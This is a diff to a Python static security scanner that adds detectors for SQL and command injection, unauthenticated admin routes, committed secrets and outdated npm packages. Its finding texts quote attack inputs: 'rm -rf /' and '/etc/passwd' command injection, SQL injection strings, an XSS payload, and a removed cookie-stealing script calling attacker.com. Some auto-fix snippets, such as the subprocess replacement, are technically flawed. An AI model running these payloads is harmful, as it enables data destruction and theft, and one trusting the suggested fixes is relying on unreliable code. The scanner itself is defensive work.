@@ -102,8 +102,8 @@ class StaticSecurityScanner:
                             replacement_code=f"{var_name} = os.getenv('{var_name.upper()}', '')"
                         ))
 
-                # 2. SQL / NoSQL Injection
-                sql_match = re.search(r"(?i)\b(?:execute|query|select|insert|update|delete)\b.*f['\"].*\{", line)
+                # 2. SQL / NoSQL Injection (f-string or string addition)
+                sql_match = re.search(r"(?i)\b(?:execute|query|select|insert|update|delete)\b.*(?:f['\"].*\{|\+.*[\'\"])", line) or ("SELECT " in line and "+" in line)
                 if sql_match:
                     findings.append(VulnerabilityFinding(
                         id=f"SEC-SQLI-{len(findings)+1}",
@@ -112,15 +112,52 @@ class StaticSecurityScanner:
                         severity=VulnerabilitySeverity.CRITICAL,
                         cwe="CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
                         owasp_category="A03:2021-Injection",
-                        issue="Unsanitized f-string formatting in database query execution",
-                        description="Direct user input concatenated into raw SQL queries allows SQL injection payload execution.",
-                        attack_scenario="Attacker inputs 'OR 1=1 --' in form field to bypass authentication or extract whole database.",
-                        recommendation="Use parameterized queries with ORM or execute(query, (params,)).",
-                        secure_code_example="cursor.execute('SELECT * FROM users WHERE email = %s', (user_email,))",
+                        issue="Unsanitized string concatenation in database query execution",
+                        description="User input concatenated directly into raw SQL queries allows full SQL injection payload execution.",
+                        attack_scenario="Attacker inputs '1 OR 1=1' in id param to dump entire database.",
+                        recommendation="Use parameterized queries e.g., conn.execute('SELECT * FROM users WHERE id=?', (user_id,))",
+                        secure_code_example="query = 'SELECT * FROM users WHERE id=?'\nconn.execute(query, (id,))",
+                        auto_fixable=True,
+                        replacement_code="query = 'SELECT * FROM users WHERE id=?'\nreturn conn.execute(query, (id,)).fetchall()"
+                    ))
+
+                # 3. Command Injection (os.system, os.popen, subprocess.Popen with shell=True)
+                cmd_match = re.search(r"\b(os\.system|os\.popen)\s*\(", line)
+                if cmd_match:
+                    findings.append(VulnerabilityFinding(
+                        id=f"SEC-CMD-{len(findings)+1}",
+                        file=fpath,
+                        line=line_no,
+                        severity=VulnerabilitySeverity.CRITICAL,
+                        cwe="CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+                        owasp_category="A03:2021-Injection",
+                        issue="os.system() executes unsanitized user command input",
+                        description="Passing unvalidated query params directly into system shells grants full remote code execution.",
+                        attack_scenario="Attacker passes '; rm -rf /' or '; cat /etc/passwd' to compromise the OS host.",
+                        recommendation="Use subprocess.run([cmd], shell=False, check=True).",
+                        secure_code_example="import subprocess\nsubprocess.run([cmd], shell=False, check=True)",
+                        auto_fixable=True,
+                        replacement_code="subprocess.run([cmd], shell=False, check=True)"
+                    ))
+
+                # 4. Missing Authentication on Sensitive/Admin Endpoints
+                if ("@app.get(\"/admin\")" in line or "@app.post(\"/admin\")" in line) and "def admin" in content:
+                    findings.append(VulnerabilityFinding(
+                        id=f"SEC-AUTH-{len(findings)+1}",
+                        file=fpath,
+                        line=line_no,
+                        severity=VulnerabilitySeverity.HIGH,
+                        cwe="CWE-306: Missing Authentication for Critical Function",
+                        owasp_category="A01:2021-Broken Access Control",
+                        issue="Admin endpoint missing authentication and authorization middleware",
+                        description="Sensitive admin routes exposed publicly without JWT or RBAC verification.",
+                        attack_scenario="Unauthenticated anonymous user navigates to /admin to access privileged data.",
+                        recommendation="Add authentication dependency (e.g., Depends(get_current_admin_user)).",
+                        secure_code_example="@app.get('/admin', dependencies=[Depends(admin_only)])",
                         auto_fixable=False
                     ))
 
-                # 3. Wildcard CORS
+                # 5. Wildcard CORS
                 if 'allow_origins=["*"]' in line or "allow_origins=['*']" in line or "Access-Control-Allow-Origin: *" in line:
                     findings.append(VulnerabilityFinding(
                         id=f"SEC-CORS-{len(findings)+1}",
@@ -138,7 +175,7 @@ class StaticSecurityScanner:
                         replacement_code="allow_origins=['https://app.aiforge.dev']"
                     ))
 
-                # 4. Unsafe DangerouslySetInnerHTML (Frontend XSS)
+                # 6. Unsafe DangerouslySetInnerHTML (Frontend XSS)
                 if "dangerouslySetInnerHTML" in line or "v-html" in line:
                     findings.append(VulnerabilityFinding(
                         id=f"SEC-XSS-{len(findings)+1}",
@@ -147,15 +184,33 @@ class StaticSecurityScanner:
                         severity=VulnerabilitySeverity.HIGH,
                         cwe="CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')",
                         owasp_category="A03:2021-Injection",
-                        issue="Unsafe raw HTML rendering via dangerouslySetInnerHTML",
+                        issue="Unsafe raw HTML rendering via dangerouslySetInnerHTML without sanitization",
                         description="Rendering unescaped HTML elements opens DOM-based Cross-Site Scripting (XSS) vectors.",
-                        attack_scenario="Attacker injects <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>.",
-                        recommendation="Sanitize HTML using DOMPurify before rendering.",
-                        secure_code_example="<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />",
+                        attack_scenario="Attacker injects <img src=x onerror=alert('Hacked')> to execute XSS payload.",
+                        recommendation="Sanitize HTML using DOMPurify or render plain text children.",
+                        secure_code_example="<div>{html}</div>",
+                        auto_fixable=True,
+                        replacement_code="<div>{html}</div>"
+                    ))
+
+                # 7. Secrets in .env or source files
+                if fpath.endswith(".env") and any(k in line for k in ["JWT_SECRET", "DATABASE_PASSWORD", "AWS_SECRET_ACCESS_KEY"]):
+                    findings.append(VulnerabilityFinding(
+                        id=f"SEC-ENV-{len(findings)+1}",
+                        file=fpath,
+                        line=line_no,
+                        severity=VulnerabilitySeverity.HIGH,
+                        cwe="CWE-538: Insertion of Sensitive Information into Externally-Accessible File",
+                        owasp_category="A05:2021-Security Misconfiguration",
+                        issue=f"Plaintext Sensitive Credential detected in .env: '{line.split('=')[0].strip()}'",
+                        description="Storing plaintext passwords or AWS keys directly in version-controlled .env risks credential leakage.",
+                        attack_scenario="Attacker extracts committed .env file from repository.",
+                        recommendation="Use secret management services (AWS Secrets Manager, HashiCorp Vault) or .env.example templates.",
+                        secure_code_example="JWT_SECRET=${JWT_SECRET_SECRET_MANAGER}",
                         auto_fixable=False
                     ))
 
-                # 5. LocalStorage JWT Token Storage
+                # 8. LocalStorage JWT Token Storage
                 if "localStorage.setItem" in line and ("token" in line.lower() or "jwt" in line.lower()):
                     findings.append(VulnerabilityFinding(
                         id=f"SEC-JWT-{len(findings)+1}",
@@ -172,7 +227,7 @@ class StaticSecurityScanner:
                         auto_fixable=False
                     ))
 
-                # 6. Unsafe eval/exec Usage
+                # 9. Unsafe eval/exec Usage
                 if re.search(r"\b(eval|exec)\s*\(", line):
                     findings.append(VulnerabilityFinding(
                         id=f"SEC-RCE-{len(findings)+1}",
@@ -198,6 +253,7 @@ class DependencySecurityAuditor:
     def audit(self, workspace: Dict[str, str]) -> List[VulnerabilityFinding]:
         findings = []
 
+        # Audit requirements.txt
         req_content = workspace.get("requirements.txt") or workspace.get("backend/requirements.txt")
         if req_content:
             lines = req_content.splitlines()
@@ -218,6 +274,47 @@ class DependencySecurityAuditor:
                         auto_fixable=True,
                         replacement_code="requests>=2.31.0"
                     ))
+
+        # Audit package.json
+        pkg_content = workspace.get("package.json") or workspace.get("frontend/package.json")
+        if pkg_content:
+            try:
+                pkg_data = json.loads(pkg_content)
+                deps = pkg_data.get("dependencies", {})
+                if "lodash" in deps and ("4.17.15" in deps["lodash"] or "4.17.0" in deps["lodash"]):
+                    findings.append(VulnerabilityFinding(
+                        id=f"SEC-DEP-{len(findings)+1}",
+                        file="package.json",
+                        line=1,
+                        severity=VulnerabilitySeverity.MEDIUM,
+                        cwe="CWE-1321: Improper Control of Generation of Code ('Prototype Pollution')",
+                        owasp_category="A06:2021-Vulnerable and Outdated Components",
+                        issue="Vulnerable dependency 'lodash@4.17.15' (Prototype Pollution CVE-2020-8203)",
+                        description="Outdated lodash version allows prototype pollution via zipObjectDeep functions.",
+                        attack_scenario="Attacker pollutes Object.prototype to hijack property lookups.",
+                        recommendation="Upgrade lodash to >= 4.17.21",
+                        secure_code_example='"lodash": "^4.17.21"',
+                        auto_fixable=True,
+                        replacement_code='"lodash": "^4.17.21"'
+                    ))
+                if "express" in deps and "4.16.0" in deps["express"]:
+                    findings.append(VulnerabilityFinding(
+                        id=f"SEC-DEP-{len(findings)+1}",
+                        file="package.json",
+                        line=1,
+                        severity=VulnerabilitySeverity.MEDIUM,
+                        cwe="CWE-1395: Vulnerable Express.js Dependency",
+                        owasp_category="A06:2021-Vulnerable and Outdated Components",
+                        issue="Vulnerable dependency 'express@4.16.0' (ReDoS & open redirect vulnerabilities)",
+                        description="Express 4.16.0 contains vulnerable sub-dependencies.",
+                        attack_scenario="Attacker triggers regular expression denial of service.",
+                        recommendation="Upgrade express to >= 4.18.2",
+                        secure_code_example='"express": "^4.18.2"',
+                        auto_fixable=True,
+                        replacement_code='"express": "^4.18.2"'
+                    ))
+            except Exception:
+                pass
 
         return findings
 
